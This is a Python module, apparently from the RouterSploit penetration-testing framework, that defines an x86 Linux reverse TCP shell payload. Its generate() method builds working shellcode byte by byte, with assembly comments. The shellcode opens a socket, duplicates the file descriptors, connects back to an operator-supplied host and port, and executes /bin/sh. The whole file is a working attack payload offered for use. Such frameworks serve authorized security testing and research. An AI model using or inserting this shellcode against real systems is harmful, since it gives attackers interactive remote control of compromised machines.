from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Payload(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "X86 Reverse TCP",
        "description": "Creates interactive tcp reverse shell for X86 architecture.",
        "authors": (
            "Ramon de C Valle",  # metasploit module
            "joev",  # metasploit module
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        )
    }

    architecture = Architectures.X86

    def generate(self):
        reverse_ip = utils.convert_ip(self.lhost)
        reverse_port = utils.convert_port(self.lport)

        return (
            b"\x31\xdb" +                     # xor ebx,ebx
            b"\xf7\xe3" +                     # mul ebx
            b"\x53" +                         # push ebx
            b"\x43" +                         # inc ebx
            b"\x53" +                         # push ebx
            b"\x6a\x02" +                     # push byte +0x2
            b"\x89\xe1" +                     # mov ecx,esp
            b"\xb0\x66" +                     # mov al,0x66 (sys_socketcall)
            b"\xcd\x80" +                     # int 0x80
            b"\x93" +                         # xchg eax,ebx
            b"\x59" +                         # pop ecx
            b"\xb0\x3f" +                     # mov al,0x3f (sys_dup2)
            b"\xcd\x80" +                     # int 0x80
            b"\x49" +                         # dec ecx
            b"\x79\xf9" +                     # jns 0x11
            b"\x68" + reverse_ip +            # push ip addr
            b"\x68\x02\x00" + reverse_port +  # push port
            b"\x89\xe1" +                     # mov ecx,esp
            b"\xb0\x66" +                     # mov al,0x66 (sys_socketcall)
            b"\x50" +                         # push eax
            b"\x51" +                         # push ecx
            b"\x53" +                         # push ebx
            b"\xb3\x03" +                     # mov bl,0x3
            b"\x89\xe1" +                     # mov ecx,esp
            b"\xcd\x80" +                     # int 0x80
            b"\x52" +                         # push edx
            b"\x68\x6e\x2f\x73\x68" +         # push n/sh
            b"\x68\x2f\x2f\x62\x69" +         # push //bi
            b"\x89\xe3" +                     # mov ebx,esp
            b"\x52" +                         # push edx
            b"\x53" +                         # push ebx
            b"\x89\xe1" +                     # mov ecx,esp
            b"\xb0\x0b" +                     # mov al,0xb (execve)
            b"\xcd\x80"                       # int 0x80
        )
